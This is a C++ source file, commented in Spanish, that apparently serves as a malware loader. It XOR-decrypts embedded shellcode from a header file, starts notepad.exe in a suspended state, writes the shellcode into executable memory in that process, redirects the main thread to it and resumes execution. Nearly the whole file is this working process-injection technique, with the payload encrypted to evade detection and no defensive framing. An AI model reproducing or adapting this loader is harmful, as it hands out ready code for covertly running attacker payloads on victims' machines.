#include <windows.h>
#include <iostream>
#include "syscalls.h" // Para llamadas directas a ntdll
#include "shellcode.h" // Aquí se incluirá el shellcode encriptado generado con xxd

// Función para descifrar el shellcode en memoria usando XOR
void decrypt_shellcode(unsigned char* shellcode, size_t size) {
    for (size_t i = 0; i < size; i++) {
        shellcode[i] ^= 0x55; // Misma clave usada en Python
    }
}

int main() {
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    // Crear un proceso suspendido (notepad.exe)
    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, 
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::cerr << "Error al crear el proceso" << std::endl;
        return 1;
    }

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    // Obtener el contexto del hilo principal del proceso suspendido
    if (!GetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "Error al obtener el contexto del hilo" << std::endl;
        return 1;
    }

    // Reservar memoria en el proceso suspendido
    LPVOID alloc = VirtualAllocEx(pi.hProcess, NULL, encrypted_shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!alloc) {
        std::cerr << "Error al reservar memoria en el proceso" << std::endl;
        return 1;
    }

    // 📌 **Aquí se descifra el shellcode antes de inyectarlo**
    decrypt_shellcode(encrypted_shellcode, encrypted_shellcode_len);

    // Escribir el shellcode en la memoria del proceso suspendido
    if (!WriteProcessMemory(pi.hProcess, alloc, encrypted_shellcode, encrypted_shellcode_len, NULL)) {
        std::cerr << "Error al escribir en la memoria del proceso" << std::endl;
        return 1;
    }

    // Cambiar el punto de ejecución del proceso al shellcode
    #ifdef _WIN64
        ctx.Rip = (DWORD64)alloc; // Para sistemas de 64 bits
    #else
        ctx.Eip = (DWORD)alloc; // Para sistemas de 32 bits
    #endif

    // Aplicar los cambios en el contexto del proceso
    if (!SetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "Error al modificar el contexto del hilo" << std::endl;
        return 1;
    }

    // Reanudar el proceso (Ejecutará el shellcode)
    ResumeThread(pi.hThread);

    std::cout << "[+] Proceso inyectado exitosamente" << std::endl;

    return 0;
}
